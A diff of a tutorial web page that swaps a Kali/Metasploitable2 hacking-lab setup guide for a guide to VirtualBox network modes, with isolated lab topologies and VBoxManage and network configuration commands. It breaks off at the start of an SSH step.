-                        penetration testing lab | Metasploitable2 exploit practice</p>
-                    <p>So you want to learn ethical hacking — but where do you actually practice? You can't test
-                        exploits on real websites or
-                        networks without breaking the law. The solution every professional uses is a personal hacking
-                        lab: an isolated, fully
-                        offline environment where you can attack intentionally vulnerable systems legally and safely.
+                    <p class="keywords"><strong>Keywords:</strong> VirtualBox network modes | VirtualBox NAT Network vs
+                        Host-Only | isolated hacking lab network setup | VirtualBox network
+                        configuration tutorial | ethical hacking lab VirtualBox</p>
+                    <p>If your Kali Linux VM cannot ping Metasploitable2, or your vulnerable VM is accidentally exposed
+                        to your home Wi-Fi, the
+                        problem is almost always one thing: wrong VirtualBox network mode. Network misconfiguration is
+                        the #1 reason beginner
+                        hacking labs break — and most tutorials skip the explanation entirely.
                     </p>
                     <div class="card-image-output">
-                        <img src="images/set-up-ethical-hacking-lab-virtualbox-kali-linux-metasploitable2.webp"
-                            alt="set up ethical hacking lab virtualbox kali-linux metasploitable2">
+                        <img src="images/configure-virtualbox-networks-for-isolated-hacking-lab.webp"
+                            alt="How to Configure VirtualBox networks for Secure Cybersecurity Lab (Step-by-Step Guide)">
                     </div>
                     <div class="card-main-info">
-                        <p>In this step-by-step guide, you will set up a free, production-grade ethical hacking lab on
-                            your own computer using
-                            VirtualBox, Kali Linux, and Metasploitable2 — the same tools used by real penetration
-                            testers, CEH candidates, and OSCP
-                            aspirants.
+                        <p>This guide gives you a complete, no-confusion understanding of all six VirtualBox network
+                            modes, three ready-to-use lab
+                            topologies, and exact configuration steps for building a properly isolated ethical hacking
+                            lab on your own computer.
                         </p>
                     </div>
+                    <h4>Why VirtualBox Network Configuration Matters</h4>
+                    <p>VirtualBox has six completely different network modes — and choosing the wrong one has serious
+                        consequences:
+                    </p>
+                    <div class="bg-color">
+                        <pre>
+Wrong mode  ⟶ Kali can't reach Metasploitable  (lab broken)
+Wrong mode  ⟶ Metasploitable exposed to LAN    (security risk)
+Wrong mode  ⟶ Kali loses internet mid-session  (update broken)
+Right mode  ⟶ Isolated, functional, safe lab   ✔
+</pre>
+                    </div>
+                    <p>Most beginners leave every VM on the default NAT setting — which means two VMs on NAT mode cannot
+                        communicate with each
+                        other at all, even though they appear identically configured.
+                    </p>
 
+                    <h4>What This Tutorial Covers</h4>
+                    <div class="list">
+                        <p>By the end of this guide you will fully understand and be able to configure:</p>
+                        <ul>
+                            <li>All 6 VirtualBox network modes — NAT, NAT Network, Host-Only, Internal Network, Bridged,
+                                Not Attached.</li>
+                            <li>Three production-ready lab topologies — NAT Network (recommended), Internal Network
+                                (maximum
+                                isolation), Host-Only + NAT
+                                (host terminal access).</li>
+                            <li>Dual-adapter Kali setup — lab attacks on one adapter, internet access on another
+                                simultaneously.</li>
+                            <li>Port forwarding — access VM services from your host browser or terminal.</li>
+                            <li>VBoxManage CLI reference — script your entire lab setup from the command line.</li>
+                            <li>Troubleshooting — fix every common VM connectivity issue.</li>
+                            <li>Security checklist — ensure Metasploitable never leaks onto your real LAN.</li>
+                        </ul>
+                    </div>
+                    <div class="pro-tips">
+                        <p><strong>⚠️ Security Reminder:</strong> This guide configures a private, self-contained lab
+                            environment. Never connect intentionally vulnerable VMs like
+                            Metasploitable2 to your real LAN or the internet. Accidental exposure puts your own network
+                            at risk.</p>
+                    </div>
                 </div>
             </div>
 
             <div class="card linux-card introduction-card">
-                <h2>Introduction</h2>
-                <div class="pro-tips">
-                    <p><strong>⚠️ Legal Disclaimer:</strong> Everything in this tutorial runs inside an isolated virtual
-                        network on your own machine. You are attacking intentionally
-                        vulnerable VMs that you own. This is 100% legal. Never use these techniques on systems,
-                        networks, or devices you do not
-                        own or have explicit written permission to test. Unauthorised access is a criminal offence under
-                        India's IT Act 2000,
-                        the US CFAA, and equivalent laws worldwide.</p>
-                </div>
-                <h3>What You Will Build</h3>
-                <p class="subtitle">By the end of this tutorial, your setup will look like this:</p>
-                <div class="card-image-output">
-                    <img src="images/hacking-lab-architecture-diagram.webp"
-                        alt="set up ethical hacking lab virtualbox kali-linux metasploitable2">
-                </div>
-                <h4>What You Will Learn</h4>
-                <div class="list">
-                    <p class="subtitle">By completing this tutorial you will be able to:</p>
-                    <ul>
-                        <li>Install and configure VirtualBox on Windows, macOS, or Linux.</li>
-                        <li>Import a Kali Linux VM without installing from ISO</li>
-                        <li>Set up Metasploitable2 as your permanent practice target.</li>
-                        <li>Build an isolated Host-Only network between attacker and target.</li>
-                        <li>Run a full Nmap reconnaissance scan and read the results.</li>
-                        <li>Exploit the vsftpd 2.3.4 backdoor (CVE-2011-2523) to get root shell.</li>
-                        <li>Practice Samba, MySQL, and bindshell exploits.</li>
-                        <li>Access DVWA for web application vulnerability practice.</li>
-                        <li>Write a professional penetration test report for your portfolio.</li>
-                    </ul>
-                </div>
-                <div class="table-container">
-                    <h4>Your Lab vs Other Platforms</h4>
-                    <table>
-                        <thead>
-                            <tr>
-                                <th>Feature</th>
-                                <th>This Lab</th>
-                                <th>TryHackMe</th>
-                                <th>HackTheBox</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            <tr>
-                                <td><strong>Cost</strong></td>
-                                <td>₹0 forever</td>
-                                <td>₹800–2,000/month</td>
-                                <td>Paid tiers</td>
-                            </tr>
-                            <tr>
-                                <td><strong>Internet required</strong></td>
-                                <td>Fully offline</td>
-                                <td>Yes</td>
-                                <td>Yes</td>
-                            </tr>
-                            <tr>
-                                <td><strong>Legal risk</strong></td>
-                                <td>Zero</td>
-                                <td>Zero</td>
-                                <td>Zero</td>
-                            </tr>
-                            <tr>
-                                <td><strong>Customisable</strong></td>
-                                <td>Fully</td>
-                                <td>Limited</td>
-                                <td>Limited</td>
-                            </tr>
-                            <tr>
-                                <td><strong>Real OS + CVEs</strong></td>
-                                <td>Yes</td>
-                                <td>Yes</td>
-                                <td>Yes</td>
-                            </tr>
-                            <tr>
-                                <td><strong>Best for</strong></td>
-                                <td>First setup + real exploits</td>
-                                <td>Guided challenges</td>
-                                <td>Advanced labs</td>
-                            </tr>
-                        </tbody>
-                    </table>
-                </div>
-                <div class="table-container">
-                    <h4>System Requirements</h4>
-                    <table>
-                        <thead>
-                            <tr>
-                                <th>Spec</th>
-                                <th>Minimum</th>
-                                <th>Recommended</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            <tr>
-                                <td><strong>RAM</strong></td>
-                                <td>8 GB</td>
-                                <td>16 GB</td>
-                            </tr>
-                            <tr>
-                                <td><strong>Storage</strong></td>
-                                <td>40 GB free</td>
-                                <td>60 GB SSD</td>
-                            </tr>
-                            <tr>
-                                <td><strong>CPU</strong></td>
-                                <td>Dual-core + VT-x/AMD-V</td>
-                                <td>Quad-core i5/Ryzen 5</td>
-                            </tr>
-                            <tr>
-                                <td><strong>OS</strong></td>
-                                <td>Windows 10, macOS 12, Ubuntu 20.04</td>
-                                <td>Windows 11 / macOS 14</td>
-                            </tr>
-                        </tbody>
-                    </table>
-                </div>
-
-                <div class="table-container">
-                    <h4>Downloads — Get Everything Before Starting</h4>
-                    <p>Download all files first to avoid interruptions during setup:</p>
-                    <table>
-                        <thead>
-                            <tr>
-                                <th>File</th>
-                                <th>Source</th>
-                                <th>Size</th>
-                                <th>Direct Link</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            <tr>
-                                <td><strong>VirtualBox 7.x</strong></td>
-                                <td>virtualbox.org</td>
-                                <td>~100 MB</td>
-                                <td><a class="link"
-                                        href="https://www.virtualbox.org/wiki/Downloads">virtualbox.org/wiki/Downloads</a>
-                                </td>
-                            </tr>
-                            <tr>
-                                <td><strong>VirtualBox Extension Pack</strong></td>
-                                <td>virtualbox.org</td>
-                                <td>~50 MB</td>
-                                <td>Same page as above</td>
-                            </tr>
-                            <tr>
-                                <td><strong>Kali Linux VirtualBox Image</strong></td>
-                                <td>kali.org</td>
-                                <td>~3 GB</td>
-                                <td><a class="link"
-                                        href="https://www.kali.org/get-kali/#kali-virtual-machines">kali.org/get-kali/#kali-virtual-machines</a>
-                                </td>
-                            </tr>
-                            <tr>
-                                <td><strong>Metasploitable2 ZIP</strong></td>
-                                <td>SourceForge</td>
-                                <td>~900 MB</td>
-                                <td><a class="link"
-                                        href="https://sourceforge.net/projects/metasploitable/files/Metasploitable2/">sourceforge.net/projects/metasploitable</a>
-                                </td>
-                            </tr>
-                        </tbody>
-                    </table>
-                </div>
-
-                <div class="tip">
-                    <p><strong>For Kali:</strong> Download the "VirtualBox" image (pre-built .ova or .7z)
-                        NOT the ISO — the VM image saves 30 minutes of installation</p>
-                    <p><strong>For Metasploitable2:</strong> Download the .zip ⟶ contains a .vmdk disk file</p>
-                </div>
                 <div class="content">
-                    <h3>Download Files — Purpose Explained</h3>
-                    <h4>1. VirtualBox 7.x — The Hypervisor (Foundation)</h4>
-                    <p class="sub"><strong class="subtitle">What it is:</strong></p>
-                    <p>VirtualBox is a Type 2 hypervisor — software that lets your physical computer run multiple
-                        operating systems
-                        simultaneously inside
-                        isolated containers called Virtual Machines (VMs). Think of it as a "computer inside your
-                        computer."
+                    <h2>Introduction</h2>
+                    <p>Network misconfiguration is the #1 reason beginner hacking labs break — either the attacker VM
+                        can't reach the target,
+                        the target leaks onto your real LAN, or Kali loses internet access mid-session. [<a
+                            href="https://www.youtube.com/watch?v=TIV0TZvZJP8" class="link"> 1 </a>] VirtualBox
+                        has six distinct network
+                        modes, each with completely different behaviour. Choosing the wrong one either kills your lab
+                        connectivity or — worse —
+                        accidentally exposes a vulnerable VM to your home network.
                     </p>
-                    <p class="sub"><strong class="subtitle">Why you need it:</strong></p>
-                    <p>This is the core engine that powers your entire hacking lab. Without VirtualBox, you have no way
-                        to run Kali Linux or
-                        Metasploitable2 — both are VMs that exist only inside VirtualBox. It creates the isolated
-                        sandbox where all your hacking
-                        practice happens safely.
+                    <p>This guide gives you a complete understanding of every mode, the exact configuration steps for
+                        three
+                        lab topologies, and
+                        a CLI reference for scripting your setup.
                     </p>
-                    <p class="sub"><strong class="subtitle">What happens if you skip it:</strong></p>
-                    <p>Nothing else in this project works. Kali and Metasploitable2 cannot run without a hypervisor.
-                    </p>
-                    <p><strong>Free for:</strong> Personal use on Windows, macOS, and Linux.</p>
-
-                    <h4>2. VirtualBox Extension Pack — Feature Unlocker</h4>
-                    <p class="sub"><strong class="subtitle">What it is:</strong></p>
-                    <p>A proprietary add-on that unlocks advanced hardware features not included in the base VirtualBox
-                        installation.redresscompliance+1.
-                    </p>
+                    <h3>All Six VirtualBox Network Modes Explained</h3>
                     <div class="table-container">
-                        <p><strong>Specific features it adds:</strong></p>
+                        <h4>Quick Reference Matrix</h4>
                         <table>
                             <thead>
                                 <tr>
-                                    <th>Feature</th>
-                                    <th>Why it matters for your lab</th>
+                                    <th>Mode</th>
+                                    <th>VM ⟶ Internet</th>
+                                    <th>VM ↔ VM</th>
+                                    <th>Host ↔ VM</th>
+                                    <th>Visible on LAN</th>
+                                    <th>Use For</th>
                                 </tr>
                             </thead>
                             <tbody>
                                 <tr>
-                                    <td><strong>USB 2.0 / 3.0 support</strong></td>
-                                    <td>Connect USB drives, adapters, WiFi dongles to your Kali VM</td>
+                                    <td><strong>NAT (default)</strong></td>
+                                    <td>✅ Yes</td>
+                                    <td>❌ No</td>
+                                    <td>❌ No (port fwd only)</td>
+                                    <td>❌ No</td>
+                                    <td>Single VM internet</td>
                                 </tr>
                                 <tr>
-                                    <td><strong>VirtualBox RDP server</strong></td>
-                                    <td>Remotely access your VM desktop from another machine</td>
+                                    <td><strong>NAT Network</strong></td>
+                                    <td>✅ Yes</td>
+                                    <td>✅ Yes</td>
+                                    <td>❌ No (port fwd only)</td>
+                                    <td>❌ No</td>
+                                    <td>Multi-VM lab + internet</td>
                                 </tr>
                                 <tr>
-                                    <td><strong>Webcam passthrough</strong></td>
-                                    <td>Use your physical webcam inside the VM</td>
+                                    <td><strong>Host-Only</strong></td>
+                                    <td>❌ No</td>
+                                    <td>✅ Yes</td>
+                                    <td>✅ Yes</td>
+                                    <td>❌ No</td>
+                                    <td>Lab + host access</td>
                                 </tr>
                                 <tr>
-                                    <td><strong>Disk encryption</strong></td>
-                                    <td>Encrypt VM disk files for security</td>
+                                    <td><strong>Internal Network</strong></td>
+                                    <td>❌ No</td>
+                                    <td>✅ Yes</td>
+                                    <td>❌ No</td>
+                                    <td>❌ No</td>
+                                    <td>Maximum isolation</td>
                                 </tr>
                                 <tr>
-                                    <td><strong>NVMe storage controller</strong></td>
-                                    <td>Faster SSD-level disk I/O inside VMs</td>
+                                    <td><strong>Bridged</strong></td>
+                                    <td>✅ Yes</td>
+                                    <td>✅ Yes</td>
+                                    <td>✅ Yes</td>
+                                    <td>✅ YES ⚠️</td>
+                                    <td>Production-like testing</td>
                                 </tr>
                                 <tr>
-                                    <td><strong>Intel PXE Boot ROM</strong></td>
-                                    <td>Boot VMs over a network (useful for advanced labs)</td>
+                                    <td><strong>Not Attached</strong></td>
+                                    <td>❌ No</td>
+                                    <td>❌ No</td>
+                                    <td>❌ No</td>
+                                    <td>❌ No</td>
+                                    <td>Air-gapped single VM</td>
                                 </tr>
                             </tbody>
                         </table>
                     </div>
-                    <p class="sub"><strong class="subtitle">Why you need it for this lab:</strong></p>
-                    <p>The base VirtualBox only supports USB 1.1 (slow, limited). The Extension Pack upgrades this to
-                        USB 2.0/3.0, which is
-                        essential if you want to attach a WiFi adapter or USB drive to Kali Linux for wireless
-                        pentesting exercises.backup+1
+                    <div class="pro-tips">
+                        <p>⚠️ Never use Bridged mode for Metasploitable2 —
+                            it exposes the vulnerable VM to every device on
+                            your home Wi-Fi network.</p>
+                    </div>
+                </div>
+
+                <div class="content">
+                    <h3>Deep Dive: Each Mode Explained</h3>
+                    <h4>NAT (Default)</h4>
+                    <p>NAT is the out-of-the-box default — every new VM uses it. VirtualBox creates a virtual router
+                        inside the
+                        host, assigns the VM an
+                        IP in the 10.0.2.0/24 range, and translates outbound traffic through the host's real connection.
+                        [ <a href="https://www.codingcipher.com/post/virtualbox-network-modes-explained-nat-bridged-nat-network-host-only-internal"
+                            class="link">2</a> ]
                     </p>
-                    <p class="sub"><strong class="subtitle">What happens if you skip it:</strong></p>
-                    <p>The lab still works for this tutorial. However, you will be limited to USB 1.1 only and cannot
-                        use advanced features
-                        like wireless adapter passthrough for WiFi hacking labs later.
-                    </p>
-                    <p class="sub"><strong class="subtitle">License note::</strong></p>
-                    <p>Free for personal/educational use under Oracle's PUEL license. Not free for commercial enterprise
-                        use.[<a
-                            href="https://redresscompliance.com/virtualbox-extension-pack-advanced-features-and-licensing/"
-                            class="link">redresscompliance</a>]​.
+                    <div class="modal" id="modal">
+                        <div class="modal-content">
+                            <div class="modal-header">
+                                <div class="modal-title" id="word-title">Word</div>
+                                <button class="close-btn" id="close-btn">&times;</button>
+                            </div>
+                            <div class="modal-body">
+                                <div class="definition-label">Definition</div>
+                                <div class="definition-text" id="definition"></div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="card-image-output">
+                        <img src="images/nat-default.webp" alt="Nat Default">
+                    </div>
+                    <p>The critical limitation: Each VM gets its own completely separate NAT router. Two VMs both on NAT
+                        mode cannot
+                        communicate with each other even though they look identically configured. This is why your ping
+                        between Kali and
+                        Metasploitable fails if both are on default NAT. [ <a
+                            href="https://www.codingcipher.com/post/virtualbox-network-modes-explained-nat-bridged-nat-network-host-only-internal"
+                            class="link">2</a> ]
                     </p>
 
-                    <h4>3. Kali Linux VirtualBox Image — The Attacker Machine</h4>
-                    <p class="sub"><strong class="subtitle">What it is:</strong></p>
-                    <p>Kali Linux is a Debian-based Linux distribution purpose-built for penetration testing and ethical
-                        hacking. It comes
-                        pre-installed with 600+ security tools including Nmap, Metasploit, Wireshark, Burp Suite, Hydra,
-                        Aircrack-ng, and more.
-                        The VirtualBox Image (.ova or .7z) is a pre-configured, ready-to-import VM — the OS is already
-                        installed inside
-                        it.reddit+1
-                    </p>
-                    <p class="sub"><strong class="subtitle">Why you need it:</strong></p>
-                    <p>This is your attacker machine — the system you control to run all scans and exploits against
-                        Metasploitable2. All the
-                        commands in this tutorial (nmap, msfconsole, nc) run from inside this VM.
-                    </p>
                     <div class="table-container">
-                        <p><strong>VirtualBox Image vs ISO — what's the difference?</strong></p>
+                        <p><strong>Default NAT address assignments:</strong></p>
                         <table>
                             <thead>
                                 <tr>
-                                    <th>Type</th>
-                                    <th>What it is</th>
-                                    <th>Time to ready</th>
+                                    <th>Component</th>
+                                    <th>Default NAT Address</th>
+                                    <th>Function</th>
                                 </tr>
                             </thead>
                             <tbody>
                                 <tr>
-                                    <td><strong>VirtualBox Image (use this)</strong></td>
-                                    <td>Pre-built VM — just import and boot</td>
-                                    <td>~5 minutes</td>
+                                    <td><strong>VM IP</strong></td>
+                                    <td><code class="code">10.0.2.15</code></td>
+                                    <td>The internal address assigned to your Kali/Metasploitable VM.</td>
                                 </tr>
                                 <tr>
-                                    <td><strong>ISO</strong></td>
-                                    <td>Raw installer — you manually install the OS like a new computer</td>
-                                    <td>~30–45 minutes</td>
+                                    <td><strong>Virtual Gateway</strong></td>
+                                    <td><code class="code">10.0.2.2</code></td>
+                                    <td>Used by the VM to reach the outside internet.</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>DHCP Server</strong></td>
+                                    <td><code class="code">10.0.2.3</code></td>
+                                    <td>Automatically assigns IPs to VMs when they boot.</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>DNS Server</strong></td>
+                                    <td><code class="code">10.0.2.3</code></td>
+                                    <td>Resolves domain names (e.g., google.com) for the VM.</td>
                                 </tr>
                             </tbody>
                         </table>
-                        <p>The VirtualBox Image is recommended for beginners — it skips the full OS installation and
-                            gets you hacking
-                            faster.sitepoint+1.</p>
                     </div>
-                    <p class="sub"><strong class="subtitle">What happens if you skip it:</strong></p>
-                    <p>You have no attacker machine. You cannot run any of the tools, exploits, or scans in the
-                        tutorial.
-                    </p>
+                </div>
 
-                    <h4>4. Metasploitable2 ZIP — The Intentional Victim</h4>
-                    <p class="sub"><strong class="subtitle">What it is:</strong></p>
-                    <p>Metasploitable2 is an intentionally vulnerable Ubuntu Linux server VM created by Rapid7 (makers
-                        of Metasploit)
-                        specifically as a safe, legal target for practising attacks. It is deliberately misconfigured
-                        and runs outdated,
-                        unpatched software with known CVEs.[<a
-                            href="https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/"
-                            class="link">docs.rapid7</a>]​.
+                <div class="content">
+                    <h4>NAT Network [Recommended for Most Labs]</h4>
+                    <p>NAT Network is NAT shared between multiple VMs — all VMs join the same virtual router, can reach
+                        each other, and share a
+                        single NAT exit to the internet. This is the best choice for a Kali + Metasploitable lab where
+                        you want internet on Kali
+                        but full isolation from your real LAN. [ <a
+                            href="https://www.codingcipher.com/post/virtualbox-network-modes-explained-nat-bridged-nat-network-host-only-internal"
+                            class="link">2</a> ]
                     </p>
+                    <div class="card-image-output">
+                        <img src="images/nat-network.webp" alt="NAT Network">
+                    </div>
+                </div>
+
+                <div class="content">
+                    <h4>Host-Only Adapter</h4>
+                    <p>Host-Only creates a virtual network card on your host machine (shown as VirtualBox Host-Only
+                        Ethernet Adapter in
+                        Windows, vboxnet0 on Linux) that bridges the host and all VMs. VMs can talk to each other and to
+                        the host, but have no
+                        route to the internet.
+                    </p>
+                    <div class="card-image-output">
+                        <img src="images/host-only-network.webp" alt="Host-only adapter Network">
+                    </div>
+                    <p><strong>Best use case:</strong> When you want to SSH into a VM from your host terminal, or share
+                        files easily between host and VM without
+                        internet exposure.
+                    </p>
+                </div>
+
+                <div class="content">
+                    <h4>Internal Network [Maximum Isolation]</h4>
+                    <p>Internal Network is the most locked-down mode — VMs can only talk to other VMs on the same named
+                        network. The host
+                        cannot see them, there is no internet, no DHCP unless you configure it manually.
+                    </p>
+                    <div class="card-image-output">
+                        <img src="images/internal-network.webp" alt="Internal Network">
+                    </div>
+                    <p><strong>Best use case:</strong> Malware analysis labs, or when practicing with exploits you don't
+                        want to accidentally escape your VM boundary.
+                    </p>
+                </div>
+
+                <div class="content">
+                    <h4>Bridged Adapter [Dangerous for Vulnerable VMs]</h4>
+                    <p>Bridged mode connects the VM directly to your physical network card — the VM gets its own IP from
+                        your real router's
+                        DHCP and appears as a full device on your LAN. [ <a
+                            href="https://www.codingcipher.com/post/virtualbox-network-modes-explained-nat-bridged-nat-network-host-only-internal"
+                            class="link">2</a> ]
+                    </p>
+                    <div class="card-image-output">
+                        <img src="images/bridged-adapter.webp" alt="Bridge adapter Network">
+                    </div>
+                    <p>Never use Bridged mode for Metasploitable or any intentionally vulnerable VM. Every device on
+                        your home Wi-Fi can reach
+                        it.
+                    </p>
+                </div>
+                <hr>
+                <div class="content">
+                    <h3>Three Lab Topologies — Step-by-Step Configuration</h3>
+                    <h4>Topology 1: NAT Network (Recommended Beginner Setup)</h4>
+                    <p><strong>Best for:</strong>Metasploitable with internet access on Kali. [ <a
+                            href="https://wiki.elvis.science/index.php?title=VirtualBox%3A_How_to_set_up_a_Basic_Pentesting_Lab"
+                            class="link">5</a> ]
+                    </p>
+                    <p class="sub"><strong class="subtitle">Step 1 — Create the NAT Network</strong></p>
+                    <p><strong>Via GUI:</strong></p>
+                    <div class="list">
+                        <ol>
+                            <li>VirtualBox ⟶ File ⟶ Preferences ⟶ Network</li>
+                            <li>Click + to add a NAT Network</li>
+                            <li>Configure:</li>
+                            <div class="nested-list">
+                                <ul>
+                                    <li>Name: HackLab</li>
+                                    <li>Network CIDR: 10.10.10.0/24</li>
+                                    <li>Enable DHCP</li>
+                                    <li>Supports IPv6: OFF</li>
+                                </ul>
+                            </div>
+                            <li>Click OK</li>
+                        </ol>
+                    </div>
+                    <p><strong>Via CLI (VBoxManage):</strong></p>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>cmd</p>
+                        </div>
+                        <pre>
+<code class="language-bash"># Create the NAT Network named HackLab
+VBoxManage natnetwork add \
+  --netname HackLab \
+  --network "10.10.10.0/24" \
+  --enable \
+  --dhcp on
+
+# Verify it was created
+VBoxManage natnetwork list</code></pre>
+                    </div>
+                    <p class="sub"><strong class="subtitle">Step 2 — Assign VMs to HackLab</strong></p>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>cmd</p>
+                        </div>
+                        <pre>
+<code class="language-bash"># Assign Kali to HackLab NAT Network
+VBoxManage modifyvm "Kali Linux" \
+  --nic1 natnetwork \
+  --nat-network1 "HackLab"
+
+# Assign Metasploitable to HackLab NAT Network
+VBoxManage modifyvm "Metasploitable2" \
+  --nic1 natnetwork \
+  --nat-network1 "HackLab"</code></pre>
+                    </div>
+                    <p>Or via GUI: VM ⟶ Settings ⟶ Network ⟶ Adapter 1 ⟶ Attached to: NAT Network ⟶ Name: HackLab</p>
+                    <p class="sub"><strong class="subtitle">Step 3 — Add Internet Adapter to Kali Only</strong></p>
+                    <p>Give Kali a second adapter for internet access (tool updates, research) while keeping its lab
+                        interface on HackLab: [ <a
+                            href="https://www.codingcipher.com/post/virtualbox-network-modes-explained-nat-bridged-nat-network-host-only-internal"
+                            class="link">2</a> ]
+                    </p>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>cmd</p>
+                        </div>
+                        <pre>
+<code class="language-bash">VBoxManage modifyvm "Kali Linux" \
+  --nic2 nat</code></pre>
+                    </div>
+                    <p>Or GUI: Kali Settings ⟶ Network ⟶ Adapter 2 ⟶ Enable ⟶ Attached to: NAT</p>
+                    <p class="sub"><strong class="subtitle">Final Topology:</strong></p>
+                    <div class="bg-color">
+                        <pre>
+Kali Linux
+  eth0  ⟶ 10.10.10.x    (HackLab — attacks go here)
+  eth1  ⟶ 10.0.2.15     (NAT — internet access)
+
+Metasploitable 2
+  eth0  ⟶ 10.10.10.y    (HackLab — target)
+  [no internet access]
+</pre>
+                    </div>
+                </div>
+
+                <div class="content">
+                    <h4>Topology 2: Internal Network (Maximum Isolation)</h4>
+                    <p><strong>Best for:</strong> Malware analysis, exploit development, fully air-gapped practice. [ <a
+                            href="https://www.youtube.com/watch?v=tvvi6urNY5E" class="link">4</a> ]
+                    </p>
+                    <p class="sub"><strong class="subtitle">Step 1 — Configure Internal Network on Both VMs</strong></p>
+                    <p><strong>Via CLI:</strong></p>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>cmd</p>
+                        </div>
+                        <pre>
+<code class="language-bash">VBoxManage modifyvm "Kali Linux" \
+  --nic1 intnet \
+  --intnet1 "IsolatedLab"
+
+VBoxManage modifyvm "Metasploitable2" \
+  --nic1 intnet \
+  --intnet1 "IsolatedLab"</code></pre>
+                    </div>
+                    <p>Internal Network has no built-in DHCP — you must assign static IPs manually.</p>
+
+                    <p class="sub"><strong class="subtitle">Step 2 — Assign Static IPs Inside Each VM</strong></p>
+                    <p><strong>On Kali Linux:</strong></p>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>cmd</p>
+                        </div>
+                        <pre>
+<code class="language-bash"># Temporary (until reboot)
+# Manually assigns the IP address
+sudo ip addr add 10.20.20.10/24 dev eth0
+# Turns on (activates) the eth0 network interface
+sudo ip link set eth0 up
+
+# Permanent (Kali uses NetworkManager)
+# Edits the saved network profile called "Wired connection 1" in NetworkManager
+sudo nmcli connection modify "Wired connection 1" \
+  ipv4.addresses "10.20.20.10/24" \
+  ipv4.method manual
+# Applies and activates the updated network profile immediately
+sudo nmcli connection up "Wired connection 1"</code></pre>
+                    </div>
+                    <p><strong>On Metasploitable 2:</strong></p>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>cmd</p>
+                        </div>
+                        <pre>
+<code class="language-bash"># Temporary
+sudo ifconfig eth0 10.20.20.20 netmask 255.255.255.0 up
+
+# Permanent (edit interfaces file)
+sudo nano /etc/network/interfaces</code></pre>
+                    </div>
+                    <p>Add to <code class="code">/etc/network/interfaces</code>:</p>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>cmd</p>
+                        </div>
+                        <pre>
+<code class="language-bash">auto eth0
+iface eth0 inet static
+    address 10.20.20.20
+    netmask 255.255.255.0</code></pre>
+                    </div>
+
+                    <p class="sub"><strong class="subtitle">Step 3 — Add Internet Adapter to Kali (Optional)</strong>
+                    </p>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>cmd</p>
+                        </div>
+                        <pre>
+<code class="language-bash"># Add NAT as Adapter 2 for internet on Kali only
+VBoxManage modifyvm "Kali Linux" \
+  --nic2 nat</code></pre>
+                    </div>
+
+                    <p class="sub"><strong class="subtitle">Test Connectivity:</strong></p>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>cmd</p>
+                        </div>
+                        <pre>
+<code class="language-bash"># From Kali
+ping 10.20.20.20 -c 3      # Should succeed
+ping 8.8.8.8 -c 3          # Should succeed (via eth1)
+
+# From Metasploitable
+ping 10.20.20.10 -c 3      # Should succeed
+ping 8.8.8.8 -c 3          # Should FAIL — fully isolated</code></pre>
+                    </div>
+                </div>
+
+                <div class="content">
+                    <h4>Topology 3: Host-Only + NAT (Access VMs from Host Terminal)</h4>
+                    <p><strong>Best for:</strong> When you want to SSH into your VMs from your main machine's terminal
+                        (VS Code Remote SSH, Windows Terminal, etc.). [ <a
+                            href="https://www.codingcipher.com/post/virtualbox-network-modes-explained-nat-bridged-nat-network-host-only-internal"
+                            class="link">2</a> ]
+                    </p>
+                    <p class="sub"><strong class="subtitle">Step 1 — Create a Host-Only Network</strong></p>
+                    <div class="list">
+                        <ol>
+                            <li>VirtualBox ⟶ File ⟶ Host Network Manager (or File ⟶ Preferences ⟶ Network ⟶ Host-only
+                                Networks).</li>
+                            <li>Click Create — VirtualBox creates <code class="code">vboxnet0</code> (Linux/Mac) or
+                                <code class="code">VirtualBox Host-Only Ethernet
+                            Adapter</code> (Windows)
+                            </li>
+                            <li>Configure:</li>
+                            <div class="list">
+                                <ul>
+                                    <li>IPv4 Address: <code class="code">192.168.56.1</code> (host's address on this
+                                        network)</li>
+                                    <li>IPv4 Mask: <code class="code">255.255.255.0</code></li>
+                                    <li>Enable DHCP Server</li>
+                                    <li>DHCP Server Address: <code class="code">192.168.56.100</code></li>
+                                    <li>Lower Address Bound: <code class="code">192.168.56.101</code></li>
+                                    <li>Upper Address Bound: <code class="code">192.168.56.254</code></li>
+                                </ul>
+                            </div>
+                        </ol>
+                    </div>
+                    <p><strong>Via CLI:</strong></p>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>cmd</p>
+                        </div>
+                        <pre>
+<code class="language-bash"># Create host-only network
+VBoxManage hostonlyif create
+
+# Configure IP on the host-only interface
+VBoxManage hostonlyif ipconfig vboxnet0 \
+  --ip 192.168.56.1 \
+  --netmask 255.255.255.0
+
+# Enable DHCP on it
+VBoxManage dhcpserver add \
+  --ifname vboxnet0 \
+  --ip 192.168.56.100 \
+  --netmask 255.255.255.0 \
+  --lowerip 192.168.56.101 \
+  --upperip 192.168.56.254 \
+  --enable</code></pre>
+                    </div>
+
+                    <p class="sub"><strong class="subtitle">Step 2 — Assign Adapters to Kali</strong></p>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>cmd</p>
+                        </div>
+                        <pre>
+<code class="language-bash"># Adapter 1: Host-Only (SSH from host, VM-to-VM)
+VBoxManage modifyvm "Kali Linux" \
+  --nic1 hostonly \
+  --hostonlyadapter1 "vboxnet0"
+
+# Adapter 2: NAT (internet access)
+VBoxManage modifyvm "Kali Linux" \
+  --nic2 nat</code></pre>
+                    </div>
+
+                    <p class="sub"><strong class="subtitle">Step 3 — SSH Into Kali from Host</strong></p>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>cmd</p>
+                        </div>
+                        <pre>
